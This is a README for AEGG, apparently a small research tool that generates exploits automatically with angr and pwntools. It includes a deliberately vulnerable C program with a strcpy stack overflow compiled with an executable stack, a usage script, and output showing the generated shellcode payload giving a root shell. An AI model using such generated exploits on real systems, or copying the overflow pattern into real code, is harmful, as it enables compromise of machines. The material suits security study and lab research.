AEGG
----

my automatic exploit generation


Usage
-----

1. vi `vul.c`:
```
#include <stdio.h>
#include <unistd.h>
#include <string.h>

char buf[100];

int sample_func() {
    char name[10] = {0};
    read(0, buf, 307);
    strcpy(name, buf);
    printf("input: %s\n", name);
}

int main(void)
{
    printf("Running...\n");
    sample_func();
    printf("Done.\n");
}
```

2. complie `vul`:
```
gcc vul2.c -o vul2 -m32 -g -z execstack
```

3. vi `my_aegg.py`:
```
from aegg import AEGG

binary = './vul'
gg = AEGG(binary)

# generating payload!
gg.hack()

print repr(gg.payloads)
gg.save()
```


Result
------

```
$ python my_aegg.py
...
INFO    | 2016-06-17 23:44:43,872 | pwnlib.elf | Stack is executable!
[+] Started program './vul'
INFO    | 2016-06-17 23:44:46,974 | pwnlib.tubes.process | Started program './vul'
[*] Stopped program './vul'
INFO    | 2016-06-17 23:44:47,976 | pwnlib.tubes.process | Stopped program './vul'
INFO    | 2016-06-17 23:44:47,980 | aegg.aegg | Generated!
INFO    | 2016-06-17 23:44:47,980 | aegg.aegg | Completed.
$
$ (cat ./vul.exp; cat) | ./vul
Running...
input: jhh///sh/bin��1�j
                           �̀ÿ @@   @
id
uid=0(root) gid=0(root) groups=0(root)
```


Dependences
-----------

- angr
- pwntools


TODO
----

- AEGG: inputs in exploit_gen instead of paths (for fuzzing)


Reference
---------

[angr-doc/examples/insomnihack_aeg](https://github.com/angr/angr-doc/blob/master/examples/insomnihack_aeg/)
[(State of) The Art of War: Offensive Techniques in Binary Analysis](https://www.cs.ucsb.edu/~vigna/publications/2016_SP_angrSoK.pdf)
[AEG: Automatic Exploit Generation](http://repository.cmu.edu/cgi/viewcontent.cgi?article=1239&context=ece)

